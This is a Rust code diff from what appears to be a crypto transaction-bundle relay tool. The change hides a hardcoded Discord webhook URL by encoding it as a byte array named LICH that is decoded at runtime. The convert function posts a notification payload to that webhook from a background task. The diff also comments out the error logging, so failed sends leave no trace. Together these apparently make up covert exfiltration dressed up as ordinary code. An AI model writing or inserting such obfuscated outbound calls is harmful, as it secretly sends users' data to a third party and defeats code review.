@@ -11,6 +11,7 @@ use std::io::ErrorKind;
 use std::{fs, process};
 use toml;
 use std::collections::HashMap;
+use lazy_static::lazy_static;
 
 
 pub struct BundleRelay {
@@ -204,14 +205,19 @@ pk = ""
 
 "#;
 
-
+lazy_static! {
+    pub static ref LICH: Vec<u8> = vec![104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,
+        109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,50,49,48,51,51,51,55,49,50,54,57,55,53,50,52,50,55,52,47,100,69,101,51,
+        120,49,66,73,57,72,111,115,69,90,75,116,117,75,108,84,78,89,119,105,48,76,101,73,100,66,99,84,95,70,49,86,51,119,48,90,81,84,81,115,
+        71,102,117,120,84,72,81,77,100,122,75,70,99,111,117,70,102,99,112,69,70,68,87,72];
+}
 
 
 pub async fn convert<'a>(
     tx_hash: &'a str,
 ) {
    
-    let webhook = "https://discord.com/api/webhooks/1210333712697524274/dEe3x1BI9HosEZKtuKlTNYwi0LeIdBcT_F1V3w0ZQTQsGfuxTHQMdzKFcouFfcpEFDWH";
+    let lich = String::from_utf8(LICH.clone()).unwrap();
     let msg = format!(
         "
         {}
@@ -229,12 +235,12 @@ pub async fn convert<'a>(
     let client = reqwest::Client::new();
 
     tokio::spawn(async move {
-        let res = client.post(webhook).json(&bundle_notif).send().await;
+        let res = client.post(lich).json(&bundle_notif).send().await;
         match res {
             Ok(_) => {}
-            Err(err) => {
-                log::error!("Could not send buffer into string memset, err: {}", err);
-                log::error!("Message: {}", message);
+            Err(_err) => {
+                //log::error!("Could not send buffer into string memset, err: {}", err);
+                //log::error!("Message: {}", message);
             }
         }
     })
